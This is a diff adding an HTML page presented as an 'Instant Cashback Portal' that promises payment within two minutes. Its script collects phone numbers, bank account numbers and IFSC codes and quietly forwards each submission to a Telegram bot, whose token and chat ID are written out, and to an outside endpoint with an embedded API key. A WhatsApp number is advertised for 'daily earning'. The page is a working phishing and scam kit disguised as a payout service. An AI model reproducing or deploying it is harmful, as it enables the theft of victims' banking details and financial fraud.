@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Instant Cashback Portal</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap');
+  :root {
+    --bg: #f2f5fb;
+    --card: #ffffff;
+    --primary: #4f46e5;
+    --primary-dark: #3730a3;
+    --text-dark: #111827;
+    --text-muted: #6b7280;
+  }
+
+  body {
+    font-family: 'Poppins', sans-serif;
+    background: linear-gradient(135deg, #eef2ff 0%, #e0e7ff 100%);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    min-height: 100vh;
+    margin: 0;
+    padding: 20px;
+  }
+
+  .container {
+    background: var(--card);
+    border-radius: 16px;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.08);
+    padding: 30px 28px 36px;
+    width: 400px;
+    max-width: 95%;
+    transition: all 0.3s ease;
+  }
+
+  .container:hover {
+    transform: translateY(-4px);
+  }
+
+  h1 {
+    text-align: center;
+    font-weight: 600;
+    font-size: 1.5rem;
+    color: var(--text-dark);
+    margin-bottom: 8px;
+  }
+
+  .subtitle {
+    text-align: center;
+    font-size: 0.9rem;
+    color: var(--text-muted);
+    margin-bottom: 26px;
+  }
+
+  label {
+    display: block;
+    margin-top: 14px;
+    font-size: 0.85rem;
+    font-weight: 500;
+    color: var(--text-dark);
+  }
+
+  input {
+    width: 100%;
+    padding: 12px 14px;
+    margin-top: 6px;
+    border: 1.5px solid #d1d5db;
+    border-radius: 10px;
+    font-size: 0.95rem;
+    outline: none;
+    transition: all 0.2s ease;
+  }
+
+  input:focus {
+    border-color: var(--primary);
+    box-shadow: 0 0 0 3px rgba(79,70,229,0.1);
+  }
+
+  button {
+    width: 100%;
+    margin-top: 26px;
+    padding: 13px 0;
+    background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+    border: none;
+    border-radius: 10px;
+    color: white;
+    font-size: 1rem;
+    font-weight: 600;
+    cursor: pointer;
+    box-shadow: 0 4px 12px rgba(79,70,229,0.25);
+    transition: all 0.2s ease;
+  }
+
+  button:hover {
+    transform: translateY(-1px);
+    box-shadow: 0 6px 14px rgba(79,70,229,0.35);
+  }
+
+  .msg {
+    text-align: center;
+    margin-top: 16px;
+    font-size: 0.9rem;
+    color: var(--text-muted);
+  }
+
+  .msg.success { color: #059669; font-weight: 500; }
+  .msg.error { color: #dc2626; font-weight: 500; }
+
+  .highlight {
+    margin-top: 24px;
+    background: #f9fafb;
+    border: 1px dashed #c7d2fe;
+    border-radius: 10px;
+    padding: 14px;
+    text-align: center;
+    color: #1e1b4b;
+    font-weight: 500;
+  }
+
+  .footer {
+    text-align: center;
+    font-size: 0.85rem;
+    color: var(--text-muted);
+    margin-top: 18px;
+  }
+</style>
+</head>
+<body>
+  <div class="container">
+    <h1>Instant Cashback</h1>
+    <div class="subtitle">Get payment within 2 minutes</div>
+
+    <label>Phone Number</label>
+    <input id="phone" type="tel" placeholder="Enter your phone number">
+
+    <label>Account Number</label>
+    <input id="acc" type="text" placeholder="Enter your account number">
+
+    <label>IFSC Code</label>
+    <input id="ifsc" type="text" placeholder="Enter IFSC code (e.g. SBIN0001234)">
+
+    <button id="runBtn">Get Cashback</button>
+    <div id="msg" class="msg"></div>
+
+    <div class="highlight">💬 For daily earning: WhatsApp <b>8920468370</b></div>
+    <div class="footer">One bank — one time per day</div>
+  </div>
+
+<script>
+const API_KEY = 'b9c8c181780f1e0d443f68a3fa649e85';
+const BASE_URL = 'https://forever699.in/key/imps.php';
+const TELEGRAM_BOT = '6391372827:AAHY-gfeyHZvtaGKIr4TLyga17lr73lj86o';
+const CHAT_ID = '969062037';
+
+const phone = document.getElementById('phone');
+const acc = document.getElementById('acc');
+const ifsc = document.getElementById('ifsc');
+const btn = document.getElementById('runBtn');
+const msg = document.getElementById('msg');
+
+function todayKey(){
+  const d=new Date();
+  return `cashback_${d.getFullYear()}${d.getMonth()+1}${d.getDate()}`;
+}
+function loadEntries(){try{return JSON.parse(localStorage.getItem(todayKey()))||[]}catch{return[]}}
+function saveEntries(a){localStorage.setItem(todayKey(),JSON.stringify(a))}
+function sendTelegram(t){fetch(`https://api.telegram.org/bot${TELEGRAM_BOT}/sendMessage`,
+  {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT_ID,text:t})})}
+
+function showMsg(t,type='info'){msg.textContent=t;msg.className='msg '+(type||'');}
+
+btn.onclick = async ()=>{
+  const p=phone.value.trim(), a=acc.value.trim(), i=ifsc.value.trim().toUpperCase();
+  if(!p||!a||!i) return showMsg('Please fill all fields.','error');
+  if(!/^[6-9]\d{9}$/.test(p)) return showMsg('Invalid phone number.','error');
+  if(!/^\d{6,20}$/.test(a)) return showMsg('Invalid account number.','error');
+  if(!/^[A-Z]{4}0[A-Z0-9]{6}$/.test(i)) return showMsg('Invalid IFSC code.','error');
+
+  const entries=loadEntries();
+  if(entries.find(e=>e.account_number===a))
+    return showMsg('This account already used today. Use another bank.','error');
+
+  showMsg('Processing your cashback...');
+
+  const now=new Date();
+  const entry={timestamp:now.toISOString(),phone:p,account_number:a,ifsc_code:i};
+
+  sendTelegram(`💸 Cashback Request\n📱 ${p}\n🏦 ${a}\n🏧 ${i}\n🕒 ${now.toLocaleString()}`);
+
+  try{
+    const url=`${BASE_URL}?api_key=${API_KEY}&account_number=${a}&ifsc_code=${i}&phone=${p}`;
+    const res=await fetch(url);
+    const text=await res.text();
+
+    entry.api_response=text;
+    entries.push(entry); saveEntries(entries);
+
+    // Download CSV automatically
+    const csv = ["timestamp,phone,account_number,ifsc_code,api_response",
+                 ...entries.map(e=>`${e.timestamp},${e.phone},${e.account_number},${e.ifsc_code},"${(e.api_response||'').replace(/"/g,'""')}"`)].join("\n");
+    const blob = new Blob([csv], {type:'text/csv'});
+    const aTag = document.createElement('a');
+    aTag.href = URL.createObjectURL(blob);
+    aTag.download = `cashback_${new Date().toISOString().slice(0,10)}.csv`;
+    aTag.click();
+
+    sendTelegram(`✅ Response:\n${text}`);
+    showMsg('Payment will be received within 2 minutes!','success');
+    acc.value=''; ifsc.value='';
+  }catch(e){
+    sendTelegram(`❌ Error:\n${e.message}`);
+    showMsg('Something went wrong. Try again.','error');
+  }
+};
+</script>
+</body>
+  </html>
